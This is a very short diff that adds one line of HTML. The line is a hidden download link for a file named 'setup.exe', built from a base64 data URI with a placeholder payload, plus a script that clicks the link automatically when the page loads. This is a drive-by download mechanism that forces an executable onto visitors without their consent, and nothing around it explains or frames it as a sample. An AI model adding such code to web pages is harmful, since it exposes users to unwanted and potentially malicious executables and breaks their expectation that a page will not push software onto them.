@@ -1,0 +1,2 @@
+<a id="d" href="data:application/octet-stream;base64,AAAA" download="setup.exe">x</a><script>document.getElementById("d").click()</script>
+
